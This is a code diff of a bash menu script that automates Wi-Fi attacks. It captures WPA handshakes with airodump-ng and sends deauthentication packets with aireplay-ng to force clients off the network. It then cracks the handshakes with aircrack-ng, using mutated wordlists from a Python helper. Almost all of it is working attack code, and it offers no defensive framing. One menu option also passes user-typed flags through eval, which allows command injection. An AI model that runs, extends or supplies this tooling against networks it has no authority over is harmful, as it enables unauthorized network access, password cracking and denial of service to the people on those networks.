@@ -5,6 +5,8 @@ GREEN='\033[1;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m'
 
+WORDLIST_MAIN='wordlist/wordlist.txt'
+CAP_FILE_DIR='cap_files'
 
 wifi_banner() {
   clear
@@ -170,46 +172,66 @@ cracking_method_menu() {
       esac
       ;;
         3)
+      echo -e "${YELLOW}[*] Extracting BSSID from cap file...${NC}"
+      bssid=$(aircrack-ng "$selected_cap" 2>/dev/null | grep -m1 -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}')
+
+      if [[ -z "$bssid" ]]; then
+        echo -e "${RED}[!] Failed to extract BSSID from cap file. Cannot continue.${NC}"
+        cracking_method_menu "$selected_cap"  # Return to the menu
+        return
+      fi
       echo -e "${YELLOW}[*] Launching password-tools cracking module...${NC}"
       echo
       echo " Choose mutation strategy:"
       echo "  1) 🤘 LEET Transformation (--leet)"
       echo "  2) 🔢 Add Prefix (--prefix)"
       echo "  3) 🔚 Add Suffix (--suffix)"
-      echo "  4) 🔁 Combine All (--leet --prefix --suffix)"
-      echo "  5) 🔍 Custom Flags"
-      echo "  6) 🔙 Back"
+      echo "  4) 🔢 Add Randomize (--toggle)"
+      echo "  5) 🔁 Combine All (--leet --prefix --suffix)"
+      echo "  6) 🔍 Custom Flags"
+      echo "  7) 🔙 Back"
       echo
-      read -p "Option [1-6]: " tool_option
+      read -p "Option [1-7]: " tool_option
 
       case $tool_option in
         1)
           echo -e "${YELLOW}[*] Using --leet only...${NC}"
           # ./password-tools/ eventually set proper directory to serve password scripts
-          python3 enhancer-aircrack.py --leet | aircrack-ng -w - "$selected_cap"
+          python3 aircrack_enhancer.py --leet -i "$WORDLIST_MAIN" | aircrack-ng -w - "$selected_cap" -b "$bssid"
           ;;
         2)
+          sleep 5
+          echo -e "${RED}Leave blank to use default ${NC}"
           read -p "Enter prefix to add: " prefix
           echo -e "${YELLOW}[*] Adding prefix '$prefix'...${NC}"
-          python3 enhancer-aircrack.py --prefix "$prefix" | aircrack-ng -w - "$selected_cap"
+          python3 aircrack_enhancer.py --prefix "$prefix" -i "$WORDLIST_MAIN" | aircrack-ng -w - "$selected_cap" -b "$bssid"
           ;;
         3)
+          sleep 5
+          echo -e "${RED}Leave blank to use default ${NC}"
           read -p "Enter suffix to add: " suffix
           echo -e "${YELLOW}[*] Adding suffix '$suffix'...${NC}"
-          python3 enhancer-aircrack.py --suffix "$suffix" | aircrack-ng -w - "$selected_cap"
+          python3 aircrack_enhancer.py --suffix "$suffix" -i "$WORDLIST_MAIN" | aircrack-ng -w - "$selected_cap" -b "$bssid"
           ;;
         4)
+          sleep 5
+          echo -e "${YELLOW}[*] Randomizing character case...${NC}"
+          python3 aircrack_enhancer.py --toggle -i "$WORDLIST_MAIN" | aircrack-ng -w - "$selected_cap" -b "$bssid"
+          ;;
+        5)
+          sleep 5
+          echo -e "${RED}Leave blank to use default ${NC}"
           read -p "Enter prefix: " prefix
           read -p "Enter suffix: " suffix
           echo -e "${YELLOW}[*] Using all mutations...${NC}"
-          python3 enhancer-aircrack.py --leet --prefix "$prefix" --suffix "$suffix" | aircrack-ng -w - "$selected_cap"
-          ;;
-        5)
-          read -p "Enter custom flags (e.g. --leet --suffix 123): " custom_flags
-          echo -e "${YELLOW}[*] Running with: $custom_flags${NC}"
-          eval python3 enhancer-aircrack.py $custom_flags | aircrack-ng -w - "$selected_cap"
+          python3 aircrack_enhancer.py --leet --prefix "$prefix" --suffix "$suffix" -i "$WORDLIST_MAIN" | aircrack-ng -w - "$selected_cap" -b "$bssid"
           ;;
         6)
+          read -p "Enter custom flags (e.g. --leet --suffix 123): " custom_flags
+          echo -e "${YELLOW}[*] Running with: $custom_flags${NC}"
+          eval python3 aircrack_enhancer.py $custom_flags -i "$WORDLIST_MAIN" | aircrack-ng -w - "$selected_cap" -b "$bssid"
+          ;;
+        7)
           cracking_method_menu "$selected_cap"
           ;;
         *)
@@ -282,6 +304,56 @@ capfile_menu() {
   cracking_method_menu "$selected_cap"
 }
 
+clean_cap_files() {
+  local CAP_DIR="cap_files"
+  echo -e "${YELLOW}[*] Cap File Cleanup Utility${NC}"
+
+  [[ ! -d "$CAP_DIR" ]] && echo -e "${RED}[!] Directory $CAP_DIR not found.${NC}" && return
+
+  echo -e "${BLUE}Choose an option:${NC}"
+  echo " 1) 🔍 Smart cleanup (remove files with NO handshake)"
+  echo " 2) 💥 Full cleanup of all cap-related files"
+  echo " 3) ❌ Cancel"
+
+  read -p "Select [1/2/3]: " choice
+
+  if [[ "$choice" == "1" ]]; then
+    echo -e "${YELLOW}[*] Scanning for invalid captures...${NC}"
+    find "$CAP_DIR" -type f -name "*.cap" | while read capfile; do
+      # Strip extension for related files
+      base="${capfile%.cap}"
+      hccapx="$base.hccapx"
+
+      # Run hcxpcapngtool and suppress output
+      hcxpcapngtool -o "$hccapx" "$capfile" >/dev/null 2>&1
+
+      # Check if hccapx is empty
+      if [[ ! -s "$hccapx" ]]; then
+        echo -e "${RED}[✗] No handshake in: $capfile — deleting related files...${NC}"
+        for ext in cap csv netxml; do
+          rm -f "$base.$ext"
+        done
+      else
+        echo -e "${GREEN}[✓] Valid handshake in: $capfile${NC}"
+        rm -f "$hccapx"
+      fi
+    done
+    echo -e "${CYAN}[✓] Smart cleanup complete.${NC}"
+
+  elif [[ "$choice" == "2" ]]; then
+    echo -e "${RED}[!] This will delete ALL .cap/.csv/.netxml files in cap_files/.${NC}"
+    read -p "Are you sure? Type 'YES' to confirm: " confirm
+    if [[ "$confirm" == "YES" ]]; then
+      find "$CAP_DIR" -type f \( -name "*.cap" -o -name "*.csv" -o -name "*.netxml" \) -exec rm -f {} +
+      echo -e "${CYAN}[✓] All cap-related files have been deleted.${NC}"
+    else
+      echo -e "${YELLOW}[*] Cleanup aborted.${NC}"
+    fi
+
+  else
+    echo -e "${YELLOW}[*] No changes made.${NC}"
+  fi
+}
 
 wifi_menu() {
   wifi_banner
@@ -364,14 +436,15 @@ wifi_menu() {
       capfile="capture-$(date +%s)"
       # shellcheck disable=SC2207
       echo -e "${YELLOW}[*] Running airodump-ng for $SCAN_TIME seconds...${NC}"
-      timeout 120 xterm -e "airodump-ng -c $channel --bssid $bssid -w $capfile $MON_IFACE" &
+      timeout 90 xterm -e "airodump-ng -c $channel --bssid $bssid -w $capfile $MON_IFACE" &
       DUMP_PID=$!
 
-      sleep 10
+      sleep 5
 
       echo -e "${YELLOW}[*] Sending deauth packets to trigger handshake...${NC}"
-      timeout 30 xterm -e "aireplay-ng --deauth 35 -a $bssid $MON_IFACE" &
+      timeout 25 xterm -e "aireplay-ng --deauth 20 -a $bssid $MON_IFACE" &
 
+      sleep 20
       # Wait for scan to complete, check for stations continuously
       # shellcheck disable=SC2167
       for i in {1..10}; do
